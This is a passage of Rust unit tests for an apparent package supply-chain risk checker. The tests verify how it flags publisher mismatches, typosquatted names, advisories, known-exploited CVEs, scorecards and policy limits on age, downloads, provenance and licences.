fn publisher_not_in_maintainers_is_a_warning() {
    let mut meta = meta();
    meta.publisher = Some("mallory".to_string());
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(ids(&findings), vec!["publisher-not-maintainer"]);
    assert!(
        finding(&findings, "publisher-not-maintainer")
            .detail
            .contains("mallory")
    );
}

#[test]
fn crates_publisher_mismatch_is_information_only() {
    let mut meta = meta();
    meta.maintainers = vec!["rust-lang-owner".to_string()];
    meta.publisher = Some("BurntSushi".to_string());
    let findings = assess(&meta, Ecosystem::CratesIo, &[], &Profile::CRATES, NOW);
    let finding = finding(&findings, "publisher-not-maintainer");
    assert_eq!(finding.severity, Severity::Info);
}

#[test]
fn team_owned_packages_do_not_judge_the_publisher() {
    let mut meta = meta();
    meta.maintainers = vec![
        "Manishearth".to_string(),
        "github:unicode-org:icu4x-release".to_string(),
    ];
    meta.publisher = Some("robertbastian".to_string());
    assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
}

#[test]
fn maintainer_matching_is_case_insensitive() {
    let mut meta = meta();
    meta.publisher = Some("Alice".to_string());
    assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
}

#[test]
fn an_empty_maintainer_list_does_not_trigger_a_mismatch() {
    let mut meta = meta();
    meta.maintainers.clear();
    meta.publisher = Some("mallory".to_string());
    assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
}

#[test]
fn ci_publishers_are_not_maintainer_mismatches() {
    // Real npm data: express@5.3.0 is published through trusted publishing
    // and reports "_npmUser": "GitHub Actions".
    for publisher in [
        "GitHub Actions",
        "github actions",
        "npm",
        "npm-cli",
        "GitLab CI",
        "CircleCI",
        "Travis CI",
        "Azure Pipelines",
        "dependabot[bot]",
    ] {
        let mut meta = meta();
        meta.publisher = Some(publisher.to_string());
        assert!(
            assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty(),
            "{publisher} should not be treated as a human publisher"
        );
    }
}

#[test]
fn one_edit_typosquat_is_high_risk() {
    let mut meta = meta();
    meta.name = "expres".to_string();
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
    assert_eq!(
        report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
        2
    );
}

#[test]
fn two_edit_typosquat_is_a_warning() {
    let mut meta = meta();
    meta.name = "expreszz".to_string();
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(finding(&findings, "typosquat").severity, Severity::Warn);
    assert_eq!(
        report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
        1
    );
}

#[test]
fn a_transposed_typosquat_is_high_risk_and_not_age_suppressed() {
    let mut meta = meta();
    meta.name = "lodahs".to_string();
    let findings = report(
        meta.clone(),
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
    );
    assert_eq!(
        finding(&findings.findings, "typosquat").severity,
        Severity::High
    );
    assert_eq!(findings.exit_code(), 2);
}

#[test]
fn homoglyph_typosquat_is_high_risk() {
    let mut meta = meta();
    meta.name = "1odash".to_string();
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    let typosquat = finding(&findings, "typosquat");
    assert_eq!(typosquat.severity, Severity::High);
    assert!(typosquat.detail.contains("lookalike"));
}

#[test]
fn deprecated_versions_are_a_warning() {
    let mut meta = meta();
    meta.deprecated = Some("use v2".to_string());
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(finding(&findings, "deprecated").severity, Severity::Warn);
}

#[test]
fn missing_repository_is_only_info() {
    let mut meta = meta();
    meta.repository = None;
    let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
    assert_eq!(ids(&findings), vec!["no-repository"]);
    assert_eq!(
        report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
        0
    );
}

#[test]
fn every_finding_cites_evidence() {
    let mut meta = meta();
    meta.name = "expres".to_string();
    meta.deprecated = Some("old".to_string());
    meta.repository = None;
    meta.publisher = Some("mallory".to_string());
    meta.install_scripts.push(InstallScript {
        name: "postinstall".to_string(),
        command: "node setup.js".to_string(),
    });
    for finding in assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW) {
        assert!(
            !finding.evidence.is_empty(),
            "finding {} has no evidence",
            finding.id
        );
        assert!(
            finding
                .evidence
                .iter()
                .any(|evidence| evidence.url.is_some()),
            "finding {} has no link",
            finding.id
        );
    }
}

#[test]
fn report_carries_registry_facts_through() {
    let mut meta = meta();
    meta.deprecated = Some("old".to_string());
    let report = report(
        meta,
        Ecosystem::Npm,
        Some(1234),
        None,
        &[],
        Profile::NPM,
        NOW,
    );
    assert_eq!(report.ecosystem, Ecosystem::Npm);
    assert_eq!(report.weekly_downloads, Some(1234));
    assert_eq!(report.maintainers, vec!["alice"]);
    assert_eq!(report.publisher.as_deref(), Some("alice"));
}

fn list(advisories: Vec<Advisory>) -> AdvisoryList {
    AdvisoryList {
        advisories,
        hidden: 0,
        stale_seconds: None,
        threat_error: None,
    }
}

fn advisory(id: &str, severity: Severity) -> Advisory {
    Advisory {
        id: id.to_string(),
        summary: "a real vulnerability".to_string(),
        severity,
        aliases: vec!["CVE-2000-0001".to_string()],
        url: format!("https://osv.dev/vulnerability/{id}"),
        fixed_versions: Vec::new(),
        details_missing: false,
        epss: None,
        kev: None,
    }
}

#[test]
fn advisories_become_findings_with_links() {
    let advisories = [advisory("GHSA-aaaa", Severity::High)];
    let findings = advisory_findings(&advisories);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].severity, Severity::High);
    assert_eq!(findings[0].id, "advisory");
    assert!(findings[0].title.contains("GHSA-aaaa"));
    assert_eq!(
        findings[0].evidence[0].url.as_deref(),
        Some("https://osv.dev/vulnerability/GHSA-aaaa")
    );
}

#[test]
fn a_high_advisory_exits_two() {
    let advisories = list(vec![advisory("GHSA-bbbb", Severity::High)]);
    let report = report(
        meta(),
        Ecosystem::Npm,
        None,
        Some(&advisories),
        &[],
        Profile::NPM,
        NOW,
    );
    assert_eq!(report.exit_code(), 2);
    assert_eq!(report.advisories.len(), 1);
}

#[test]
fn hidden_advisories_are_disclosed() {
    let advisories = AdvisoryList {
        advisories: vec![advisory("GHSA-eeee", Severity::Warn)],
        hidden: 15,
        stale_seconds: None,
        threat_error: None,
    };
    let report = report(
        meta(),
        Ecosystem::Npm,
        None,
        Some(&advisories),
        &[],
        Profile::NPM,
        NOW,
    );
    let note = report
        .findings
        .iter()
        .find(|finding| finding.id == "advisories-truncated")
        .expect("truncation must be disclosed");
    assert_eq!(note.severity, Severity::Info);
    assert!(note.detail.contains("15 additional advisories"));
    assert_eq!(report.hidden_advisories, 15);
}

#[test]
fn a_low_advisory_is_informational() {
    let advisories = list(vec![advisory("GHSA-cccc", Severity::Info)]);
    let report = report(
        meta(),
        Ecosystem::Npm,
        None,
        Some(&advisories),
        &[],
        Profile::NPM,
        NOW,
    );
    assert_eq!(report.exit_code(), 0);
}

#[test]
fn an_unreachable_osv_is_flagged_but_does_not_fail_the_run() {
    let report = report(meta(), Ecosystem::Npm, None, None, &[], Profile::NPM, NOW);
    assert_eq!(report.exit_code(), 0);
    assert_eq!(report.findings.len(), 1);
    assert_eq!(report.findings[0].id, "advisory-check-unavailable");
    assert_eq!(report.findings[0].severity, Severity::Info);
}

#[test]
fn a_kev_listing_is_its_own_warning() {
    let mut item = advisory("GHSA-aaaa", Severity::High);
    item.epss = Some(crate::exploit::EpssScore {
        cve: "CVE-2000-0001".to_string(),
        epss: 0.42,
        percentile: 0.94,
    });
    item.kev = Some(crate::exploit::KevEntry {
        cve: "CVE-2000-0001".to_string(),
        date_added: "2024-03-01".to_string(),
        ransomware: true,
        vendor: "Acme".to_string(),
        product: "Widget".to_string(),
    });
    let findings = advisory_findings(&[item]);
    let exploited = findings
        .iter()
        .find(|finding| finding.id == "known-exploited")
        .expect("KEV listing must produce a finding");
    assert_eq!(exploited.severity, Severity::Warn);
    assert_eq!(exploited.confidence(), Confidence::High);
    assert!(exploited.detail.contains("0.420"));
    assert!(exploited.detail.contains("94th percentile"));
    assert!(exploited.detail.contains("ransomware"));
    assert!(
            exploited
                .evidence
                .iter()
                .any(|evidence| evidence.url.as_deref()
                    == Some("https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2000-0001"))
        );
    let advisory_finding = findings
        .iter()
        .find(|finding| finding.id == "advisory")
        .expect("the advisory stays WARN-or-higher on its own");
    assert_eq!(advisory_finding.severity, Severity::High);
    assert!(
        advisory_finding
            .evidence
            .iter()
            .any(|evidence| evidence.label == "EPSS")
    );
}

#[test]
fn epss_alone_never_escalates_an_advisory() {
    let mut item = advisory("GHSA-bbbb", Severity::Info);
    item.epss = Some(crate::exploit::EpssScore {
        cve: "CVE-2000-0001".to_string(),
        epss: 0.97,
        percentile: 0.99,
    });
    let findings = advisory_findings(&[item]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].severity, Severity::Info);
    assert!(
        !findings
            .iter()
            .any(|finding| finding.id == "known-exploited")
    );
}

#[test]
fn failed_exploit_lookup_is_info_and_does_not_fail_the_run() {
    let mut advisories = list(vec![advisory("GHSA-cccc", Severity::High)]);
    advisories.threat_error = Some("CISA KEV: boom".to_string());
    let report = report(
        meta(),
        Ecosystem::Npm,
        None,
        Some(&advisories),
        &[],
        Profile::NPM,
        NOW,
    );
    assert_eq!(report.exit_code(), 2, "the advisory still decides the exit");
    let note = report
        .findings
        .iter()
        .find(|finding| finding.id == "threat-data-unavailable")
        .expect("a failed lookup must be disclosed");
    assert_eq!(note.severity, Severity::Info);
    assert!(note.detail.contains("CISA KEV: boom"));
}

#[test]
fn a_low_scorecard_only_matters_when_the_publisher_changed() {
    let mut meta = meta(); // publisher "alice" is a maintainer: no publisher finding
    meta.scorecard = Some(crate::scorecard::Scorecard {
        overall: 3.2,
        date: "2026-08-24T00:00:00Z".to_string(),
        checks: vec![
            crate::scorecard::ScorecardCheck {
                name: "Maintained".to_string(),
                score: 2,
            },
            crate::scorecard::ScorecardCheck {
                name: "Signed-Releases".to_string(),
                score: -1,
            },
        ],
    });
    let unchanged = report(
        meta.clone(),
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
    );
    assert!(
        !unchanged
            .findings
            .iter()
            .any(|finding| finding.id == "low-scorecard")
    );
    assert_eq!(unchanged.scorecard.as_ref().map(|s| s.overall), Some(3.2));

    let mut changed = meta;
    changed.publisher = Some("mallory".to_string());
    let changed_report = report(changed, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW);
    let finding = finding(&changed_report.findings, "low-scorecard");
    assert_eq!(finding.severity, Severity::Info);
    assert!(finding.detail.contains("3.2/10"));
    assert!(finding.detail.contains("Maintained 2"));
    assert!(!finding.detail.contains("Signed-Releases"));
    assert!(
        finding
            .evidence
            .iter()
            .any(|evidence| evidence.url.as_deref()
                == Some(
                    "https://securityscorecards.dev/viewer/?uri=github.com/alice/some-package"
                ))
    );
}

#[test]
fn a_missing_scorecard_is_not_checked_not_clean() {
    let report = report(meta(), Ecosystem::Npm, None, None, &[], Profile::NPM, NOW);
    assert!(report.scorecard.is_none());
    assert!(report.not_checked.contains(&"scorecard"));
}

#[test]
fn policy_age_and_download_limits_are_inclusive() {
    let mut policy = crate::allowlist::Policy {
        min_age_days: Some(30),
        min_weekly_downloads: Some(100),
        ..crate::allowlist::Policy::default()
    };
    let mut old = meta();
    old.first_published_at = Some(NOW - 30 * date::SECONDS_PER_DAY);
    let report = report_with_policy(
        old.clone(),
        Ecosystem::Npm,
        Some(100),
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id.starts_with("policy-"))
    );

    let mut young = old;
    young.first_published_at = Some(NOW - 29 * date::SECONDS_PER_DAY);
    let report = report_with_policy(
        young,
        Ecosystem::Npm,
        Some(99),
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    assert_eq!(
        finding(&report.findings, "policy-min-age").severity,
        Severity::Warn
    );
    let downloads = finding(&report.findings, "policy-min-downloads");
    assert!(downloads.detail.contains("99"));
    assert!(downloads.detail.contains("100"));

    policy.severity = Some(Severity::Info);
    let report = report_with_policy(
        report_meta_young(),
        Ecosystem::Npm,
        Some(1),
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    assert_eq!(
        finding(&report.findings, "policy-min-age").severity,
        Severity::Info
    );
}

#[test]
fn policy_provenance_requires_a_published_attestation() {
    let policy = crate::allowlist::Policy {
        require_provenance: Some(true),
        ..crate::allowlist::Policy::default()
    };
    let mut missing = meta();
    missing.provenance = crate::model::Provenance::Missing;
    let report = report_with_policy(
        missing,
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    assert_eq!(
        finding(&report.findings, "policy-provenance").severity,
        Severity::Warn
    );

    let report = report_with_policy(
        meta(),
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id == "policy-provenance"),
        "an ecosystem without attestations is unknown, not missing"
    );
}

#[test]
fn policy_advisory_severity_catches_only_higher_advisories() {
    let policy = crate::allowlist::Policy {
        max_advisory_severity: Some(Severity::Warn),
        ..crate::allowlist::Policy::default()
    };
    let advisories = list(vec![
        advisory("GHSA-low", Severity::Info),
        advisory("GHSA-medium", Severity::Warn),
        advisory("GHSA-high", Severity::High),
    ]);
    let report = report_with_policy(
        meta(),
        Ecosystem::Npm,
        None,
        Some(&advisories),
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    let hits: Vec<&Finding> = report
        .findings
        .iter()
        .filter(|finding| finding.id == "policy-advisory-severity")
        .collect();
    assert_eq!(hits.len(), 1);
    assert!(hits[0].title.contains("GHSA-high"));
}

#[test]
fn policy_license_lists_split_allow_and_deny() {
    let policy = crate::allowlist::Policy {
        allowed_licenses: vec!["Apache-2.0".to_string()],
        denied_licenses: vec!["GPL-3.0-only".to_string()],
        ..crate::allowlist::Policy::default()
    };
    let mut meta = meta();
    meta.license = Some("MIT".to_string());
    let report = report_with_policy(
        meta.clone(),
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    assert_eq!(
        finding(&report.findings, "policy-license").severity,
        Severity::Warn
    );

    meta.license = Some("GPL-3.0".to_string());
    let report = report_with_policy(
        meta,
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    let denied = finding(&report.findings, "policy-license-denied");
    assert_eq!(denied.severity, Severity::High);
    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id == "policy-license")
    );
}

#[test]
fn an_unknown_license_is_not_checked_when_policy_needs_it() {
    let policy = crate::allowlist::Policy {
        allowed_licenses: vec!["MIT".to_string()],
        ..crate::allowlist::Policy::default()
    };
    let report = report_with_policy(
        meta(),
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
        &policy,
    );
    assert!(report.not_checked.contains(&"license"));
    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id == "policy-license")
    );

    let report = report_with_policy(
        meta(),
        Ecosystem::Npm,
        None,
        None,
        &[],
        Profile::NPM,
        NOW,
        &crate::allowlist::Policy::default(),
    );
    assert!(!report.not_checked.contains(&"license"));
}

fn report_meta_young() -> PackageMeta {
    let mut meta = meta();
    meta.first_published_at = Some(NOW - date::SECONDS_PER_DAY);
    meta
}

#[test]
fn advisory_findings_sort_above_registry_findings_of_lower_severity() {
    let mut meta = meta();
    meta.repository = None; // INFO
    let advisories = list(vec![advisory("GHSA-dddd", Severity::High)]);
    let report = report(
        meta,
        Ecosystem::Npm,
        None,
        Some(&advisories),
        &[],
        Profile::NPM,
        NOW,
    );
    assert_eq!(report.findings[0].severity, Severity::High);
    assert_eq!(report.findings[0].id, "advisory");
}
